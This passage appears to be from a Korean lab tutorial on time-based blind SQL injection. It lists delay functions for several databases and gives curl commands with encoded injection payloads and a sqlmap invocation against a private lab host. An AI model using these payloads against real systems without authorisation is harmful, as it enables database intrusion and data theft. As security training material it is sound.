    | PostgreSQL | `pg_sleep(5)` |
    | MSSQL | `WAITFOR DELAY '0:0:5'` |
    | Oracle | `DBMS_LOCK.SLEEP(5)` 또는 `DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)` |
    | SQLite | `RANDOMBLOB(100000000)` 또는 무거운 join |

    ▶ 2단계: 도구 A — curl + time 측정
    ```bash
    # 정상 응답 시간 (baseline)
    time curl -s "http://10.20.30.80/rest/products/search?q=test" -o /dev/null
    # SQLite — RANDOMBLOB 으로 지연 유발
    time curl -s "http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" -o /dev/null
    # MySQL/PostgreSQL — SLEEP/pg_sleep
    time curl -s "http://target/?q=test%27%20AND%20SLEEP(5)--" -o /dev/null
    echo "Time-based SQLi 테스트 완료"
    ```
    `real` 시간 차이가 5s+ → Time-based 확인.

    ▶ 3단계: 도구 B — sqlmap --technique=T
    ```bash
    sqlmap -u "http://10.20.30.80/rest/products/search?q=test" \
           --batch --technique=T --time-sec=5 --threads=1
    # --time-sec=5: 지연 임계 (false positive 방지 더 큰 값)
    # --threads=1: time-based 는 동시성 1 (정확도 ↑)
    ```

